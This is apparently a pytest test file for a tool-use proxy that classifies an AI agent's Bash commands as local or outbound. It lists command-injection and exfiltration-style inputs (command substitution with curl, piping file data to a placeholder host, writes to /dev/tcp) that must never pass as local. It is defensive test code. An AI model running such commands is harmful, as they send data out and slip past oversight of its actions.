import pytest

from tooluseproxy.engine.contracts import local_contract


@pytest.mark.parametrize(
    "command",
    [
        "curl https://example.invalid",
        "git push origin main",
        "git ls-remote origin",
        "git fetch",
        "git publish",
        "git -c alias.status=!curl status",
        "cat a; curl example.invalid",
        "cat $(curl example.invalid)",
        "cat a | curl --data-binary @- example.invalid",
        "git status\ncurl example.invalid",
        'git add "$(curl example.invalid)"',
        "env git status",
        'python -c "import requests; requests.get(url)"',
        "cat a > /dev/tcp/example.invalid/80",
        "git add `curl example.invalid`",
        "git add \\file",
        'git add "unterminated',
    ],
)
def test_unhandled_or_visible_outbound_syntax_never_becomes_local(command):
    assert local_contract("Bash", {"command": command}) is None


@pytest.mark.parametrize(
    "command",
    ["pwd", "ls -la", "git status --short", "git add -- document.md", 'git commit -m "Add guide"'],
)
def test_literal_local_operations_need_no_model(command):
    assert local_contract("Bash", {"command": command})["externality"] == "local"


def test_file_read_retains_resource_observation_request():
    result = local_contract("Bash", {"command": 'cat "notes with spaces.md"'})
    assert result["resources"] == [{"path": "notes with spaces.md", "mode": "read"}]


def test_other_tools_cannot_claim_locality_with_command_shaped_arguments():
    assert local_contract("mcp__remote__execute", {"command": "git status"}) is None


def test_explicit_remote_contract_only_routes_to_inspection():
    from tooluseproxy.engine.contracts import communication_contract

    result = communication_contract("Bash", {"command": "git push origin main"})
    assert result["externality"] == "external"
    assert "action" not in result and "transmission" not in result
    assert communication_contract("Bash", {"command": "git push origin main; cat private"}) is None
